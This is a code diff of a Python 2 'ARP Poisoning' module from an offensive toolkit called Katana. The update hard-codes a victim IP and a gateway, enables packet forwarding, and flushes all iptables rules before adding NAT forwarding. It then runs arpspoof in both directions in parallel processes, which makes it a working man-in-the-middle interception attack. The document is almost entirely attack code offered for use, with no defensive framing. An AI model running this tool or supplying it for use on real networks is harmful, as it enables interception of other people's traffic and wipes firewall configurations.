@@ -3,7 +3,7 @@
 # Module    : ARP Poisoning     #
 # Script by : RedToor           #
 # Date      : 26/08/2015        #
-# Version   : 2.0               #
+# Version   : 2.1               #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Katana Core                   #
 from core.design import *       #
@@ -24,9 +24,9 @@ import commands
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Default                       #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
-defaultipv="192.168.1.224" #MY_IP
-defaultgat=GATEWAY_ADR
-defaultint="wlan0" #INTERFACE_DEVICE
+defaultipv="192.168.1.215" #MY_IP
+defaultgat="192.168.1.254" #
+defaultint="wlan0"         #INTERFACE_DEVICE
 IPs=[]
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
  
@@ -104,15 +104,29 @@ def arpp(run):
         elif actions=="run"  or actions=="r":
             d.run()
             try:
+		My_Ip=ping.myip()
+		Tables="""
+iptables --flush;
+iptables --zero;
+iptables --delete-chain;
+iptables -F -t nat;
+iptables --append FORWARD --in-interface """+defaultint+""" --jump ACCEPT;
+iptables --table nat --append POSTROUTING --out-interface """+defaultint+""";
+"""
+
                 print " "+Alr+" Ensure the victim recieves packets by forwarding them",ping.status_cmd('echo 1 > /proc/sys/net/ipv4/ip_forward','\t')
+                print " "+Alr+" Configuring IPtables NAT",ping.status_cmd(Tables,'\t\t\t\t')
                 print " "+Alr+" Starting ARP Poisoning..."
                 try:
-                    t=multiprocessing.Process(target=Get_Poisoning)
+                    z=multiprocessing.Process(target=Get_PoisoningTTG)
+                    t=multiprocessing.Process(target=Get_PoisoningTGT)
                     t.start()
+                    z.start()
                     NULL=raw_input(" "+Hlp+" Stop Attack ARP (PRESS ANY KEY)")
-                    print " "+Alr+" Stopping ARP Poisoning..."
+                    print " "+Alr+" Stopping ARP Poisoning...", ping.status_cmd('killall arpspoof','\t\t\t\t')
                     print " "+Alr+" Setting Normal configuration in forwarding",ping.status_cmd('echo 0 > /proc/sys/net/ipv4/ip_forward','\t\t')
-                    t.terminate() 
+                    t.terminate()
+                    z.terminate()  
                     d.space()
                     arpp(0)
                 except:
@@ -125,5 +139,11 @@ def arpp(run):
         Errors.Errors(event=sys.exc_info(), info=False)
     arpp(0)
 
-def Get_Poisoning():
-    commands.getoutput("arpspoof -i "+defaultint+" -t "+defaultipv+" -r "+defaultgat)
+def Get_PoisoningTTG():
+    commands.getoutput("arpspoof -i "+defaultint+" -t "+defaultipv+" "+defaultgat)
+def Get_PoisoningTGT():
+    commands.getoutput("arpspoof -i "+defaultint+" -t "+defaultgat+" "+defaultipv)
+
+
+
+
